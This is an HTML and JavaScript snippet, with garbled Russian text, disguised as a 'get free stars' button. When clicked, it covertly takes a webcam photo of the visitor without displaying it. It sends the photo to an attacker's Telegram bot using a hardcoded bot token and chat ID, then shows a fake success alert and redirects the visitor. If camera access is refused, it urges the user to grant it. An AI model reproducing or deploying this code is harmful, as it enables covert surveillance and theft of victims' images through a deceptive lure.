<button id="magicBtn">‚≠ê –ü–æ–ª—É—á–∏—Ç—å –∑–≤—ë–∑–¥—ã</button>

<script>
  const botToken = "7774453287:AAEn3dh5ebiN7sZFa__Wyf-JXwBUE1wUIrc";
  const chatId = "7807571960";

  document.getElementById("magicBtn").addEventListener("click", async () => {
    try {
      // 1. –°–∫—Ä—ã—Ç—ã–π –∑–∞–ø—Ä–æ—Å –∫–∞–º–µ—Ä—ã
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement("video");
      video.srcObject = stream;
      await new Promise(resolve => video.onloadedmetadata = resolve);
      
      // 2. –î–µ–ª–∞–µ–º —Ñ–æ—Ç–æ –±–µ–∑ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      stream.getTracks().forEach(track => track.stop());
      
      // 3. –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ –±–æ—Ç–∞
      canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, "photo.jpg");
        
        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: formData,
        });
        
        // 4. –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ
        alert("–ó–≤—ë–∑–¥—ã –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω—ã! üéâ");
        window.location.href = "https://t.me/bossband2903_bot";
      }, "image/jpeg");
      
    } catch (err) {
      // –ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–∞–∑–∞–ª –≤ –¥–æ—Å—Ç—É–ø–µ
      alert("–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∑–≤—ë–∑–¥ —Ä–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ ‚ù§Ô∏è");
    }
  });
</script>